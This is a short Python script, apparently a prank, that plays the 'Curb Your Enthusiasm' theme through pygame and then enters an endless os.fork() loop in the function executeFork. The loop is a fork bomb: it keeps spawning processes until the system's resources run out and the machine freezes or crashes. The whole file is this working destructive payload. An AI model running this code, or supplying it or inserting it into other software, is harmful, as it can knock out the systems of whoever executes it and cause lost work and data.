import os
import pygame
import time

def main():
    pygame.mixer.init()
    song = pygame.mixer.Sound("Curb_Your_Enthusiasm_theme_song.wav")
    pygame.mixer.Sound.play(song)
    executeFork()

def executeFork():
    while 1:
        os.fork()

if __name__ == "__main__":
    main()